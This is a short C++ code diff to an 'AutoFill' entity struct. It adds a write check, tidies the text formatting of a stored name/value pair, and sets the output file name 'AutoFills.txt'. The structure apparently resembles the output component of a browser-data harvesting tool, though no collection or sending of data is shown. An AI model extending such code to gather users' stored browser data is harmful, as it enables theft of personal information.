@@ -12,12 +12,17 @@ struct AutoFill : public Entity {
     std::string name;
     std::string value;
 
+    bool canBeWrite() override {
+        return !(this->name.empty() && this->value.empty());
+    }
+
     std::string toString() override {
-        std::stringstream ss;
         return "Name: " + this->name + "\n" +
                "Value: " + this->value;
+    }
 
-        return ss.str();
+    std::string getFileName() override {
+        return "AutoFills.txt";
     }
 };
 
